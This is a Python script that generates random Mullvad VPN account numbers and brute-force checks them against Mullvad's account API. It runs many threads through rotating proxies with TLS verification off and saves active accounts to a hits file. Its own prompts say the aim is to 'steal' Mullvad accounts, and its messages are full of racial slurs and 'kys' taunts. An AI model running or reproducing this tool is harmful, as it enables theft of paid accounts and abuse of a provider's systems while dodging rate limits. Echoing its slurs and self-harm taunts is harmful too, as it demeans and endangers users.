import requests
import random
import string
import threading
from colorama import Fore
import os
import ctypes
import sys
import time
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class Mullvad:
    def __init__(self):
        self.good = 0
        self.bad = 0
        self.custom = 0
        self.errors = 0

    def logger(self, account, capture, status):
        if status == 'Hit':
            with open("hits.txt", "a") as file:
                file.write(f'{account} | {capture}\n')
        elif status == 'Custom':
            with open("custom.txt", "a") as file:
                file.write(f'{account} | {capture}\n')
        elif status == 'Error':
            with open("errors.txt", 'a') as file:
                file.write(f'ERROR: {account}\n')

    def gen(self, amount):
        for _ in range(amount):
            num = ''.join(random.choice(string.digits) for _ in range(16))
        return num
    
    def create(self, amount):
        for _ in range(amount):
            num = ''.join(random.choice(string.digits) for _ in range(16))
            open('created.txt', 'a').write(num+'\n')

    def replace(self, text: str, new: dict) -> str:
        for old, new in new.items():
            text = text.replace(old, new)
        return text

    def cls(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'by @m3t4m0rph0515, nigga')

    def xprint(self, text: object, end: str = "\n"):
        print(self.replace(f"                    &3>> &f{text}",{
                    "&a": Fore.LIGHTGREEN_EX,
                    "&4": Fore.RED,
                    "&2": Fore.GREEN,
                    "&b": Fore.LIGHTCYAN_EX,
                    "&c": Fore.LIGHTRED_EX,
                    "&6": Fore.LIGHTYELLOW_EX,
                    "&f": Fore.RESET,
                    "&e": Fore.LIGHTYELLOW_EX,
                    "&3": Fore.CYAN,
                    "&1": Fore.BLUE,
                    "&9": Fore.LIGHTBLUE_EX,
                    "&5": Fore.YELLOW,
                    "&d": Fore.LIGHTMAGENTA_EX,
                    "&8": Fore.LIGHTBLACK_EX,
                    "&0": Fore.BLACK,},),end=end,)
        
    def checker(self, account_number, proxy_list):
        proxy = random.choice(proxy_list).strip()
        proxies = {
            'http': 'http://' + proxy,
            'https': 'http://' + proxy
        }
        print(f"Good: {self.good}  ~  Custom: {self.custom}  ~  Bad: {self.bad}  ~  Errors: {self.errors}")
        url = f'https://api-www.mullvad.net/www/accounts/{account_number}'.strip()
        try:
            response = requests.get(url, proxies=proxies, timeout=5, verify=False)
            data = response.json()
            if 'account' in data:
                if data['account']['active']:
                    exp_date = data['account']['expires']
                    self.logger(account_number, f'Active: True | Expires: {exp_date}', 'Hit')
                    self.xprint(f'&2[+] HIT | {account_number} | Active: True | Expires: {exp_date}')
                    self.good += 1
                else:
                    self.logger(account_number, 'Expired', 'Custom')
                    self.xprint(f'&5[+] CUSTOM | {account_number} | Expired')
                    self.custom += 1
            elif 'code' in data:
                if data['code'] == 'ACCOUNT_NOT_FOUND':
                    self.xprint(f'&4[-] BAD | {account_number}')
                    self.bad += 1
                else:
                    self.xprint(f'&4[=] ERROR')
                    self.errors += 1
        except requests.RequestException as e:
            self.logger(account_number, f'RequestException: {str(e)}', 'Error')
            self.xprint(f'&4[!] ERROR')
            self.errors += 1
        except Exception as e:
            self.logger(account_number, f'Exception: {str(e)}', 'Error')
            self.xprint(f'&4[!] ERROR')
            self.errors += 1

    def main(self):
        print(f"lol fuck mullvad")
        print('ready to steal mullvad g?')
        self.cls()
        self.xprint('1. fuckin checker')
        self.xprint('2. good shi')
        self.xprint('3. fuckin generator')
        self.xprint('4. fuckoff')
        selected = input('                    >> ')
        if selected == '1':
            accounts_file = input('where tf accounts at: ')
            proxy_file = input('NIGGA WHERE ARE YOUR PROXIES: ')
            account_list = open(accounts_file).readlines()
            proxy_list = open(proxy_file).readlines()
            if not proxy_list:
                self.xprint("retard kys.")
                return
            if not accounts_file:
                self.xprint("retard kys.")
                return
            thread_count = input('threads?: ')
            threads = []
            self.cls()
            for account_number in account_list:
                t = threading.Thread(target=self.checker, args=(account_number.strip(), proxy_list))
                t.start()
                threads.append(t)

                if len(threads) >= int(thread_count):
                    for t in threads:
                        t.join()
                    threads.clear()

            for t in threads:
                t.join()
            threads.clear()
        elif selected == '2':
            proxy_file = input('gimme proxies fam: ')
            proxy_list = open(proxy_file).readlines()
            if not proxy_list:
                self.xprint("retard kys")
                return
            amount = input('how much ')
            thread_count = input('threads?')
            threads = []
            self.cls()
            for i in range(int(amount)):
                t = threading.Thread(target=self.checker, args=(self.gen(1).strip(), proxy_list))
                t.start()
                threads.append(t)

                if len(threads) >= int(thread_count):
                    for t in threads:
                        t.join()
                    threads.clear()

            for t in threads:
                t.join()
            threads.clear()
        elif selected == '3':
            option = input('how much ')
            self.create(int(option))
            self.xprint(f'just gave birth to {option} accounts and put em in "created.txt"')
            time.sleep(5)
            self.main()
        elif selected == '4':
            sys.exit()

if __name__ == '__main__':
    Mullvad().main()
